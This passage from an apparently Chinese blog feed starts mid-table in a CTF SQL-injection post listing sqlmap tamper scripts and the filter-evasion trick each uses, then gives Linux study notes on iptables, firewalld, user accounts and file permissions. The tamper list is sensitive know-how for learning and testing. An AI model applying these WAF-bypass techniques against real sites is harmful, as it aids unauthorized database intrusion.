以及换行符</td></tr><tr><td>apostrophenullencode.py</td><td>绕过过滤双引号，替换字符和双引号。</td></tr><tr><td>halfversionedmorekeywords.py</td><td>当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</td></tr><tr><td>space2morehash.py</td><td>空格替换为 #号 以及更多随机字符串 换行符</td></tr><tr><td>appendnullbyte.py</td><td>在有效负荷结束位置加载零字节字符编码</td></tr><tr><td>ifnull2ifisnull.py</td><td>绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td></tr><tr><td>space2mssqlblank.py</td><td>空格替换为其它空符号</td></tr><tr><td>base64encode.py</td><td>用base64编码替换</td></tr><tr><td>space2mssqlhash.py</td><td>替换空格</td></tr><tr><td>modsecurityversioned.py</td><td>过滤空格，包含完整的查询版本注释</td></tr><tr><td>space2mysqlblank.py</td><td>空格替换其它空白符号(mysql)</td></tr><tr><td>between.py</td><td>用between替换大于号(&gt;)</td></tr><tr><td>space2mysqldash.py</td><td>替换空格字符(“)(‘ - ‘)后跟一个破折号注释一个新行(‘ n’)</td></tr><tr><td>multiplespaces.py</td><td>围绕SQL关键字添加多个空格</td></tr><tr><td>space2plus.py</td><td>用+替换空格</td></tr><tr><td>bluecoat.py</td><td>代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换&#x3D;为like</td></tr><tr><td>nonrecursivereplacement.py</td><td>取代predefined SQL关键字with表示 suitable for替代(例如 .replace(“SELECT”、””)) filters</td></tr><tr><td>space2randomblank.py</td><td>代替空格字符(“”)从一个随机的空白字符可选字符的有效集</td></tr><tr><td>sp_password.py</td><td>追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td></tr><tr><td>chardoubleencode.py</td><td>双url编码(不处理以编码的)</td></tr><tr><td>unionalltounion.py</td><td>替换UNION ALL SELECT UNION SELECT</td></tr><tr><td>charencode.py</td><td>url编码</td></tr><tr><td>randomcase.py</td><td>随机大小写</td></tr><tr><td>unmagicquotes.py</td><td>宽字符绕过 GPC addslashes</td></tr><tr><td>randomcomments.py</td><td>用 <code>/**/</code> 分割sql关键字</td></tr><tr><td>charunicodeencode.py</td><td>字符串unicode编码</td></tr><tr><td>securesphere.py</td><td>追加特制的字符串</td></tr><tr><td>versionedmorekeywords.py</td><td>注释绕过</td></tr><tr><td>space2comment.py</td><td>Replaces space character <code>&#39; &#39;</code> with comments <code>/**/</code></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习(五)</title>
      <link href="/Linux/Linux/Linux-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E4%BA%94)/"/>
      <url>/Linux/Linux/Linux-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E4%BA%94)/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux学习-五"><a href="#Linux学习-五" class="headerlink" title="Linux学习(五)"></a>Linux学习(五)</h1><h2 id="使用iptables与firewalld防火墙"><a href="#使用iptables与firewalld防火墙" class="headerlink" title="使用iptables与firewalld防火墙"></a>使用iptables与firewalld防火墙</h2><h3 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h3><h4 id="策略与规则链"><a href="#策略与规则链" class="headerlink" title="策略与规则链"></a>策略与规则链</h4><p>防火墙会按照从上到下的顺序来读取配置的策略规则,在找到匹配项后就立即结束匹配工作区执行匹配项中定义的行为(即放行或阻止).如果在读完所有策略规则之后没有匹配项,就去执行默认的策略.当防火墙默认策略为拒绝时,就要设置允许规则,否则谁都进不来,如果防火墙默认策略为允许,就要设置拒绝规则,否则谁都能进来</p><p>iptables服务把用于处理或过滤流量的策略条目称之为规则,多条规则可以组成一个队则链,而规则量则一句数据包处理位置的不同进行分类</p><ul><li>在进行路由选择前处理数据包(PREROUTING)</li><li>处理流入的数据包(INPUT)</li><li>处理流出 的数据包(OUTPUT)</li><li>处理转发的数据包(FORWARD)</li><li>在进行路由选择后处理数据包(POSTROUTING)</li></ul><p>一般来说从内网向外网发送的流量一般都是可控且良性的,因此使用INPUT规则量</p><p>iptables术语ACCEPT(允许流量通过) REJECT(拒绝流量通过) LOG(记录日志信息) DROP(拒绝流量通过) DROP直接将流量丢弃而且不响应,REJECT则会在拒绝流量后再回复一条”信息已经收到,但是被扔掉了”信息,从而让流量发送方清晰的看到数据被拒绝的响应信息</p><p>当把Linux系统中的防火墙策略设置为REJECT动作后，流量发送方会看到端口不可达的响应</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241023177.png" alt="image-20220324102348128"></p><p>而把Linux系统中的防火墙策略修改成DROP动作后，流量发送方会看到响应超时的提醒。但是流量发送方无法判断流量是被拒绝，还是接收方主机当前不在线&#96;&#96;&#96;</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241024432.png" alt="image-20220324102408390"></p><h4 id="基本命令参数"><a href="#基本命令参数" class="headerlink" title="基本命令参数"></a>基本命令参数</h4><p> iptables中常用的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-P</td><td>设置默认策略</td></tr><tr><td>-F</td><td>清空规则链</td></tr><tr><td>-L</td><td>查看规则链</td></tr><tr><td>-A</td><td>在规则链的末尾加入新规则</td></tr><tr><td>-I num</td><td>在规则链的头部加入新规则</td></tr><tr><td>-D num</td><td>删除某一条规则</td></tr><tr><td>-s</td><td>匹配来源地址IP&#x2F;MASK，加叹号“!”表示除这个IP外</td></tr><tr><td>-d</td><td>匹配目标地址</td></tr><tr><td>-i 网卡名称</td><td>匹配从这块网卡流入的数据</td></tr><tr><td>-o 网卡名称</td><td>匹配从这块网卡流出的数据</td></tr><tr><td>-p</td><td>匹配协议，如TCP、UDP、ICMP</td></tr><tr><td>–dport num</td><td>匹配目标端口号</td></tr><tr><td>–sport num</td><td>匹配来源端口号</td></tr></tbody></table><p><strong>-L参数</strong></p><p>查看已有的防火墙规则链</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241025590.png" alt="image-20220324102534537"></p><p><strong>-F参数</strong></p><p>清空已有的防火墙规则链</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241027085.png" alt="image-20220324102721031"></p><p><strong>-P参数</strong></p><p>把INPUT规则量的默认策略设置为拒绝</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241035075.png" alt="image-20220324103526032"></p><p>当把INPUT链设置为默认拒绝以后,就要往里面写入策略,否则所有流入的数据包都会被默认拒绝掉.规则量的默认策略拒绝动作只能是DROP,而不能是REJECT</p><p><strong>-p</strong></p><p>向INPUT链中添加允许ICMP流量进入的策略规则</p><p>通常会使用ping命令来检查对方主机是否在线,而向防火墙的INPUT规则链中添加一条允许ICMP流量进入的策略规则就默认允许了这种ping命令的检测行为</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241040277.png" alt="image-20220324104008230"></p><p><strong>-D</strong></p><p>使用-F参数会清空所有的防火墙策略;使用-D参数可以删除某一条指定的策略</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241041145.png" alt="image-20220324104133091"></p><p><strong>-s</strong></p><p>要对某台主机进行匹配,可直接写出它的ip地址,如需对网段进行匹配,则需要写为子网掩码的形式(比如192.168.5.0&#x2F;24)</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241048650.png" alt="image-20220324104800607"></p><p>防火墙的策略规则是从上到下的顺序进行匹配的,因此一定要把允许动作放到拒绝动作之前,否则所有流量都会被拒绝</p><p><strong>–dport</strong></p><p>向INPUT规则链中添加拒绝所有人访问本机的12345端口的策略规则</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241052570.png" alt="image-20220324105200527"></p><p>向INPUT规则链中添加拒绝192.168.5.10主机访问本机80端口(web服务)的策略规则</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241054325.png" alt="image-20220324105438284"></p><p><strong>-A</strong></p><p>向INPUT规则链中添加拒接所有主机访问本机1000~1024端口的策略规则</p><p>在前面添加防火墙策略时,使用的是-I参数,它会默认把规则添加到最上面的位置,因此优先级是最高的,如果需要添加一条最后的”兜底”的规则,那就用-A参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241059167.png" alt="image-20220324105944120"></p><p><strong>iptables-save</strong></p><p>要注意,使用iptables命令配置的防火墙规则会默认在系统下一次重启时失效,如果想要让配置的防火墙策略永久生效</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241102732.png" alt="image-20220324110210686"></p><p>如果公司服务器是5&#x2F;6&#x2F;7版本的话，对应的保存命令应该是</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241102598.png" alt="image-20220324110227550"></p><h3 id="Firewalld"><a href="#Firewalld" class="headerlink" title="Firewalld"></a>Firewalld</h3><p>firewalld它拥有基于CLI(命令行界面)和基于GUI(图形用户界面)的两种管理方式</p><p>firewalld支持动态更新技术并加入了区域（zone）的概念。简单来说，区域就是firewalld预先准备了几套防火墙策略集合（策略模板），用户可以根据生产场景的不同而选择合适的策略集合，从而实现防火墙策略之间的快速切换。</p><p> firewalld中常用的区域名称及策略规则</p><table><thead><tr><th>区域</th><th>默认规则策略</th></tr></thead><tbody><tr><td>trusted</td><td>允许所有的数据包</td></tr><tr><td>home</td><td>拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh、mdns、ipp-client、amba-client与dhcpv6-client服务相关，则允许流量</td></tr><tr><td>internal</td><td>等同于home区域</td></tr><tr><td>work</td><td>拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh、ipp-client与dhcpv6-client服务相关，则允许流量</td></tr><tr><td>public</td><td>拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh、dhcpv6-client服务相关，则允许流量</td></tr><tr><td>external</td><td>拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh服务相关，则允许流量</td></tr><tr><td>dmz</td><td>拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh服务相关，则允许流量</td></tr><tr><td>block</td><td>拒绝流入的流量，除非与流出的流量相关</td></tr><tr><td>drop</td><td>拒绝流入的流量，除非与流出的流量相关</td></tr></tbody></table><h4 id="终端管理工具"><a href="#终端管理工具" class="headerlink" title="终端管理工具"></a>终端管理工具</h4><p>firewall-cmd是firewalld防火墙配置管理工具的CLI(命令行界面)版本,他的参数都是以长格式来提供的,但是可以使用tab键进行补齐(我的没有)</p><p>  firewall-cmd命令中使用的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>–get-default-zone</td><td>查询默认的区域名称</td></tr><tr><td>–set-default-zone&#x3D;&lt;区域名称&gt;</td><td>设置默认的区域，使其永久生效</td></tr><tr><td>–get-zones</td><td>显示可用的区域</td></tr><tr><td>–get-services</td><td>显示预先定义的服务</td></tr><tr><td>–get-active-zones</td><td>显示当前正在使用的区域与网卡名称</td></tr><tr><td>–add-source&#x3D;</td><td>将源自此IP或子网的流量导向指定的区域</td></tr><tr><td>–remove-source&#x3D;</td><td>不再将源自此IP或子网的流量导向某个指定区域</td></tr><tr><td>–add-interface&#x3D;&lt;网卡名称&gt;</td><td>将源自该网卡的所有流量都导向某个指定区域</td></tr><tr><td>–change-interface&#x3D;&lt;网卡名称&gt;</td><td>将某个网卡与区域进行关联</td></tr><tr><td>–list-all</td><td>显示当前区域的网卡配置参数、资源、端口以及服务等信息</td></tr><tr><td>–list-all-zones</td><td>显示所有区域的网卡配置参数、资源、端口以及服务等信息</td></tr><tr><td>–add-service&#x3D;&lt;服务名&gt;</td><td>设置默认区域允许该服务的流量</td></tr><tr><td>–add-port&#x3D;&lt;端口号&#x2F;协议&gt;</td><td>设置默认区域允许该端口的流量</td></tr><tr><td>–remove-service&#x3D;&lt;服务名&gt;</td><td>设置默认区域不再允许该服务的流量</td></tr><tr><td>–remove-port&#x3D;&lt;端口号&#x2F;协议&gt;</td><td>设置默认区域不再允许该端口的流量</td></tr><tr><td>–reload</td><td>让“永久生效”的配置规则立即生效，并覆盖当前的配置规则</td></tr><tr><td>–panic-on</td><td>开启应急状况模式</td></tr><tr><td>–panic-off</td><td>关闭应急状况模式</td></tr></tbody></table><p>使用firewalld配置的防火墙策略默认为运行时(RUNTIME)模式,有称为当前生效模式,而且会随着系统的重启而失效.如果想要配置策略一直存在,就需要使用永久(Permanent)模式了,方法就是在用firewall-cmd命令正常设置防火墙测量时添加–permanent参数,这样配置的防火墙策略就可以永久生效了.但是,永久上校模式有一个特点,就是他设置的策略只有在系统重启之后才会自动生效,如果想笑配置立即生效,就需要手动执行firewall-cmd –reload命令</p><p><strong>–get-default-zone</strong></p><p>在配置防火墙策略前,必须查看当前生效的是那个区域,否则配置的防火墙策略将不会立即生效</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241114608.png" alt="image-20220324111411565"></p><p><strong>–get–zone-of-interface&#x3D;ens33</strong></p><p>查询指定网卡在firewalld服务中绑定的区域</p><p>一般来说,充当网管的服务器有两块玩咖,一块对公网,另一块对内网,那么这两块网卡在审查流量时所用的策略肯定也是不一致的.因此可以根据网卡针对的流量来源,为网卡绑定不同的区域,实现第防火墙策略的灵活管控</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241118203.png" alt="image-20220324111846157"></p><p><strong>把网卡默认区域修改为external,并在系统重启后生效</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241147226.png" alt="image-20220324114736179"></p><p><strong>–set-default-zone&#x3D;public</strong></p><p>把firewalld服务的默认区域设置为public</p><p>默认区域也叫全局配置,指的是对所有的网卡都生效的配置,优先级较低.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241213438.png" alt="image-20220324121341390"></p><p><strong>–panic-on</strong></p><p>启动和关闭firewalld防火墙服务的应急状态模式</p><p>panic紧急模式,使用–panic-on参数会立即切断一切网络连接,而使用–panic-off则会恢复网络连接.紧急模式会切断一切网络连接,因此在远程管理服务器时,要注意.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241216977.png" alt="image-20220324121638928"></p><p><strong>–query-service&#x3D;ssh</strong></p><p>查看SSH和HTTPS协议的流量是否允许放行</p><p>可以不使用–zone参数指定区域名称,firewall-cmd命令会自动依据默认的区域进行查询,从而减少用户输入量,但是如果默认区域与网卡绑定不一致时,就会发生冲突,因此zone的参数还是加上为好.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241220785.png" alt="image-20220324122000740"></p><p><strong>–add-service&#x3D;https</strong></p><p>把HTTPS协议的流量设置为永久允许放行,并立即生效</p><p>默认情况下进行的修改都属于Runtime模式,即前生效而重启后失效.而在使用–permanent参数时,则是当前不会理解看到效果,而在重启或者重新加载之后方可生效.在添加了允许放行HTTPS流量的策略之后,查询当前模式策略,发现依然是不允许放行HTTPS协议的流量</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241224053.png" alt="image-20220324122431007"></p><p><strong>–reload</strong></p><p>如果不想重启服务器,就使用–reload参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241225961.png" alt="image-20220324122549916"></p><p><strong>–remove-service&#x3D;http</strong></p><p>把HTTP协议的流量设置为永久拒绝,并立即生效</p><p>由于在默认情况下HTTP协议的流量就没有被允许,所以会有提示信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241230383.png" alt="image-20220324123014339"></p><p><strong>–add-port&#x3D;8080-8081&#x2F;tcp</strong></p><p>把访问8080和8081端口的流量策略设置为允许,仅当前生效</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241232196.png" alt="image-20220324123224151"></p><p><strong>–list-ports</strong></p><p>列出当前端口策略</p><p><strong>把原本访问本机888端口的流量转发到22端口,并且要求当前和长期有效</strong></p><p>SSH远程控制协议是基于TCP&#x2F;22端口传输控制指令的,如果想让用户通过其他端口号也能访问ssh服务,也就可以试试端口转发技术了.新的端口号在收到用户请求后会自动转发到原本服务的端口上,使得用户能够通过新的端口访问到原本的服务</p><pre><code>firewall-cmd --permanent --zone=[区域] --add-forward-port=port=[源端口号]:proto=[协议];toport=[目标端口号]:toaddr=[目标ip地址]</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241239668.png" alt="image-20220324123955621"></p><p><strong>富设置的规则</strong></p><p>富规则也叫复规则,表示更加细致 更详细的防火墙策略配置,他可以针对系统服务 端口号 原地址和目标地址等诸多信息进行更有针对性的配置策略.他的优先级在所有的防火墙策略中也是最高的.比如,我们可以在firewalld服务中配置一条富规则,使其拒绝192.168.10.0&#x2F;24网段的所有用户访问本机的ssh服务(22端口)</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241247944.png" alt="image-20220324124715896"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习(四)</title>
      <link href="/Linux/Linux/Linux-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E5%9B%9B)/"/>
      <url>/Linux/Linux/Linux-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E5%9B%9B)/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux学习-四"><a href="#Linux学习-四" class="headerlink" title="Linux学习(四)"></a>Linux学习(四)</h1><h2 id="用户身份与文件权限"><a href="#用户身份与文件权限" class="headerlink" title="用户身份与文件权限"></a>用户身份与文件权限</h2><h3 id="用户身份与能力"><a href="#用户身份与能力" class="headerlink" title="用户身份与能力"></a>用户身份与能力</h3><p>linux系统中的管理员就是root,这是错误的,linux系统的管理员之所以是root,并非是他的名字叫root,而是因为该用户的身份号码即(UID)user identification 的数值为0 ,在linux系统中,UID就像我们的身份号码一样,具有唯一性,因此可以通过用户的UID来判断用户的身份.</p><ul><li>管理员UID为0:系统的管理员用户</li><li>系统用户UID为1~999:linux系统为了避免某个因服务程序出现漏洞而被黑客提权至整台服务器,默认服务程序会由独立的系统用户负责运行,进而有效控制被破坏的范围</li><li>普通用户UID从1000开始:是由管理员创建的用于日常工作的用户</li></ul><p>需要注意的是,UID是不能冲突的,而且管理员创建的普通用户的uid默认是从1000开始的(即使前面还有闲置的号码)</p><p>为了方便管理属于同一组的用户,linux引入了组的概念,通过使用用户组号码(GID Group IDentIfication)可以把多个用户添加到同一组中,从而方便为组中的用户同一划定权限或者指定任务.假设一个公司中有多个部门,每个部门中又有很多员工,如果只是想让员工访问本部门内的资源,则可以针对部门而非具体的员工来设置权限.</p><p>另外,在linux系统中创建每个用户时,将自动创建一个与其同名的基本用户组,而且这个基本用户组只有用户一个人,如果该用户以后被归纳到其他用户组,则这个其他用户组成为扩展用户组,一个用户只有一个基本用户组,但是可以有多个扩展用户组,从而满足日常的工作需要</p><p>基本用户组就像是原生家庭,实在创建账号时就自动生成的,而扩展用户组则像工作单位为了完成任务,需要加入到各个不同的群体中,这是需要手动添加的</p><h4 id="id命令"><a href="#id命令" class="headerlink" title="id命令"></a>id命令</h4><p>id命令用于显示用户的详细信息,语法格式为</p><pre><code>id 用户名</code></pre><p>这个id命令时一个在创建用户前需要学习的命令,它能够简单轻松的查看用户的基本信息,例如用户id 基本组 与扩展组gid以便于我们判别某个用户是否已经存在,以及查看相关信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231430633.png" alt="image-20220323143017596"></p><h4 id="useradd命令"><a href="#useradd命令" class="headerlink" title="useradd命令"></a>useradd命令</h4><p>useradd命令用于创建新的用户账号,语法</p><pre><code>useradd [参数] 用户名</code></pre><p>可以使用useradd命令用于创建用户账户.使用该命令创建用户时,默认的用户家目录会被存放在&#x2F;home目录中,默认的shell解释器为&#x2F;bin&#x2F;bash,而且默认会创建一个与该用户同名的基本用户组.</p><p>useradd命令中的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-d</td><td>指定用户的家目录（默认为&#x2F;home&#x2F;username）</td></tr><tr><td>-e</td><td>账户的到期时间，格式为YYYY-MM-DD.</td></tr><tr><td>-u</td><td>指定该用户的默认UID</td></tr><tr><td>-g</td><td>指定一个初始的用户基本组（必须已存在）</td></tr><tr><td>-G</td><td>指定一个或多个扩展用户组</td></tr><tr><td>-N</td><td>不创建与用户同名的基本用户组</td></tr><tr><td>-s</td><td>指定该用户的默认Shell解释器</td></tr></tbody></table><p>下面使用useradd命令创建一个名称为wanan的用户,并使用id命令确认信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231434891.png" alt="image-20220323143447848"></p><p>创建一个普通用户并指定家目录的路径,用户的UID以及shell解释器,在下面的命令中,请注意&#x2F;sbin&#x2F;nologin,他是终端解释器中的一员,与bash解释器有着天壤之别,一旦用户的解释器被设置为nologin,代表用户不能登录到系统中</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231437328.png" alt="image-20220323143744291"></p><h4 id="groupadd命令"><a href="#groupadd命令" class="headerlink" title="groupadd命令"></a>groupadd命令</h4><p>groupadd命令用于创建新的用户组语法</p><pre><code>groupadd [参数] 群组名</code></pre><p>为了能够更加高效的指派系统中各个用户的权限,在工作中常常会把这几个用户加入到同一个用户组中,这样便可以针对一类用户同一安排权限.例如在工作中成立了一个部门组,当有新同事加入是就把他的账号添加到这个部门组中,这样新同事的权限就会自动跟其他同事一模一样了,从而省去了一系列繁琐的操作</p><p>创建用户组的步骤非常简单,例如使用如下命令创建一个用户组user</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231443149.png" alt="image-20220323144311110"></p><h4 id="usermod命令"><a href="#usermod命令" class="headerlink" title="usermod命令"></a>usermod命令</h4><p>usermod命令用于修改用户的属性,英文为 user modify 语法格式为 </p><pre><code>usermod [参数] 用户名</code></pre><p>在系统中创建用户也就是修改配置文件的过程,用户的信息保存在&#x2F;etc&#x2F;passwd文件中,可以直接使用文本编辑器来修改其中的用户参数项目,也可以使用usermod命令修改已经创建的用户信息,比如用户的UID 基本&#x2F;扩展用户组 默认终端 </p><p> usermod命令中的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-c</td><td>填写用户账户的备注信息</td></tr><tr><td>-d -m</td><td>参数-m与参数-d连用，可重新指定用户的家目录并自动把旧的数据转移过去</td></tr><tr><td>-e</td><td>账户的到期时间，格式为YYYY-MM-DD</td></tr><tr><td>-g</td><td>变更所属用户组</td></tr><tr><td>-G</td><td>变更扩展用户组</td></tr><tr><td>-L</td><td>锁定用户禁止其登录系统</td></tr><tr><td>-U</td><td>解锁用户，允许其登录系统</td></tr><tr><td>-s</td><td>变更默认终端</td></tr><tr><td>-u</td><td>修改用户的UID</td></tr></tbody></table><p>将wanan用-G参数添加到root组中</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231447012.png" alt="image-20220323144737970"></p><p>使用-u参数改变wanan用户的UID号码值</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231448838.png" alt="image-20220323144831803"></p><p>将默认的&#x2F;bin&#x2F;bash修改为&#x2F;sbin&#x2F;nologin</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231450511.png" alt="image-20220323145057472"></p><p>这个用户的终端设置为&#x2F;sbin&#x2F;nologin后用户就不能登录了,但这个用户依然可以被某个服务所调用,管理某个具体的服务,这样的好处是当黑客通过这个服务侵入之后,破坏的范围也仅仅局限于这个特定的服务,而不能使用这个用户身份登录到整台服务器上.</p><h4 id="passwd命令"><a href="#passwd命令" class="headerlink" title="passwd命令"></a>passwd命令</h4><p>passwd命令用于修改用户的密码 过期时间等信息 password 语法</p><pre><code>passwd [参数] 用户名</code></pre><p>普通用户只能使用passwd命令修改自己的系统密码,而root管理员则有权限修改其他所有人的密码,root管理员在linux系统中修改自己或他人的密码时不需要验证旧密码,这一点非常方便</p><p> passwd命令中的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-l</td><td>锁定用户，禁止其登录</td></tr><tr><td>-u</td><td>解除锁定，允许用户登录</td></tr><tr><td>–stdin</td><td>允许通过标准输入修改用户密码，如echo “NewPassWord” | passwd –stdin Username</td></tr><tr><td>-d</td><td>使该用户可用空密码登录系统</td></tr><tr><td>-e</td><td>强制用户在下次登录时修改密码</td></tr><tr><td>-S</td><td>显示用户的密码是否被锁定，以及密码所采用的加密算法名称</td></tr></tbody></table><p>修改自己的密码</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231457840.png" alt="image-20220323145759795"></p><p>要修改其他人的密码,则需要先检查当前是否为root管理员权限,然后再命令后指定要修改的用户名称</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231500890.png" alt="image-20220323150015848"></p><p>可以使用passwd命令禁止用户登录系统,或者允许登录系统</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231501153.png" alt="image-20220323150158112"></p><h4 id="userdel命令"><a href="#userdel命令" class="headerlink" title="userdel命令"></a>userdel命令</h4><p>userdel命令用于删除已有的用户账户 user delete 语法</p><pre><code>userdel [参数] 用户名</code></pre><p>如果确认某位用户后续不会在登录到系统中,则可以使用userdel命令删除该用户的所有信息,在执行删除操作时,该用户的家目录默认会保留下来,此时可以使用-r参数将其删除</p><p>userdel命令中的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-f</td><td>强制删除用户</td></tr><tr><td>-r</td><td>同时删除用户及用户家目录</td></tr></tbody></table><p>在删除一个用户时,一般会建议保留他的家目录数据,以免有重要的数据被误删,所以在使用userdel命令时可以不加参数,写清楚要删除的用户名称就行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231507233.png" alt="image-20220323150744188"></p><p>虽然此时该用户已经被删除,但家目录数据会继续存放在&#x2F;home目录中,等确认删除时手动将其删除就好</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231510920.png" alt="image-20220323151038881"></p><h3 id="文件权限与归属"><a href="#文件权限与归属" class="headerlink" title="文件权限与归属"></a>文件权限与归属</h3><p>在linux系统中,每一个文件都有归属的所有者和所属组,并规定了文件的所有者 所属组以及其他人对文件所拥有的可读(r) 可写(w) 可执行(x)等权限,对于一般的文件来说,权限比较容易理解:可读表示能够读取文件的实际内容,可写表示能够编辑 新增 修改 删除文件的实际内容; 可执行表示能够运行一个脚本程序,但是对于目录文件来说,理解其权限设置就不那么简单了.对于目录文件来说,可读表示能够读取目录内的文件列表;可写表示能够在目录内新增 删除 删除 重命名文件,而可执行则表示能够进入该目录</p><p>读写执行权限对于文件与目录可执行命令的区别</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231519544.png" alt="image-20220323151956472"></p><p>文件的可读 可写 可执行权限的英文名称分别为read write execute 可以简写为rwx也可以使用数字4 2 1 来表示,文件的所有者 文件所属组及其他用户权限之间无关联</p><p>文件权限的字符与数字表示</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231521362.png" alt="image-20220323152142290"></p><p>文件权限的数字表示法基于字符(rwx)的权限计算而来的,其目的是简化权限的表示方式,例如,某个文件的权限为7, 则代表可读,可写 可执行 (4 +2 +1);若权限为6,则表示可读 可写(4+2).现在有一个文件,其所有者拥有可读 可写 可执行权限,其文件所属组拥有可读 可写的权限,其他人只有可读的权限,那么这个文件的权限就是rwxrwr-r–,数字表示法即为764.不过不能将这三个数字相加,计算出17的结果,这个不是linux系统的权限数字表示法</p><p>这里以rw-r-x-w-为例来介绍如何将字符表示的权限转换为数字表示的权限 首先,要将各个位上的字符替换为数字</p><p>减号是占位符,代表这里没有权限,在数字表示法中用0表示,也就是说rw-转换后就是420,r-x转换后就是401,-w-转换后就是020,然后将这三组数字之间的每组数字相加得出652,这便是数字表示权限</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231532476.png" alt="image-20220323153250429"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231532968.png" alt="image-20220323153256927"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231533515.png" alt="image-20220323153322475"></p><p>这里分别包含了文件的类型 访问的权限 所属者(属主) 所属组(属组) 占用的磁盘大小 最后修改时间和文件名称等信息. 该文件类型为普通文件 所属者权限可写 可读(rw-) 所属组权限可读(r–) 其他人也只有可读权限(r–) 文件的磁盘占用大小是34298字节,最近一次修改时间是4月2日的 0:23分 文件名称为 install.log</p><p>排在权限前面的减号(-)是文件类型(减号表示普通文件) linux中不同文件由于作用不同,因此类型也不尽相同.常见的文件类型包括普通文件(-) 目录文件(d) 链接文件(l) 管道文件(p) 块设备文件(b) 以及字符设备文件(c)</p><p>普通文件的范围特别广泛,比如纯文本信息 服务配置信息 日志信息以及shell脚本等 都属于是普通文件,几乎在每个目录下都能看到 普通文件(-) 和目录文件(d) 的身影.块设备文件(b)和字符设备文件(c) 一般是指硬件设备,比如鼠标 键盘等 在&#x2F;dev&#x2F;目录中最为常见</p><h3 id="文件的特殊权限"><a href="#文件的特殊权限" class="headerlink" title="文件的特殊权限"></a>文件的特殊权限</h3><p>在复杂的环境中,单纯的rwx权限是无法满足我们的需求的,因此便有了SUID 